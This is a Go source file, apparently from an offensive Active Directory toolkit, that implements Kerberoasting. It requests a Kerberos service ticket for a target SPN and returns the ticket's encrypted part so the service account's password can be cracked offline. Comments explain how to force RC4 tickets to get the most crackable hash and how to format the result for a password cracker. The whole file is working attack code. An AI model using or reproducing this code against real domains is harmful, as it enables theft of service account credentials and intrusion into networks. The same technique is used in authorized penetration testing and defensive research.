package kerberos

// KerberoastResult holds the crackable encrypted part of a service ticket
// obtained for a target SPN. The service ticket's enc-part is encrypted with the
// service account's long-term key, so it can be cracked offline to recover that
// account's password. Format it for a cracker with
// attacks.FormatTGSHash(spn, result.Realm, spn, result.EType, result.Cipher).
type KerberoastResult struct {
	// SPN is the service principal name that was roasted.
	SPN string
	// Realm is the Kerberos realm (uppercased).
	Realm string
	// EType is the encryption type of the ticket's enc-part (23 = RC4 yields the
	// most crackable hash; request it by advertising RC4 in the TGS-REQ).
	EType int
	// Cipher is the raw encrypted part of the service ticket.
	Cipher []byte
}

// Kerberoast requests a service ticket for the given SPN and returns its
// encrypted part for offline cracking. GetTGT must have succeeded first. The PAC
// is not requested (includePAC = false), yielding a shorter, PAC-free ticket as
// Kerberoasting tools do.
//
// To obtain an RC4 (NT-hash-crackable) ticket, ensure RC4 is offered; the KDC
// returns the strongest etype the service account key supports.
func (c *KerberosClient) Kerberoast(spn string) (*KerberoastResult, error) {
	ticket, _, _, _, err := c.GetTGS(spn, false)
	if err != nil {
		return nil, err
	}
	return &KerberoastResult{
		SPN:    spn,
		Realm:  c.realm,
		EType:  ticket.EncPart.EType,
		Cipher: ticket.EncPart.Cipher,
	}, nil
}
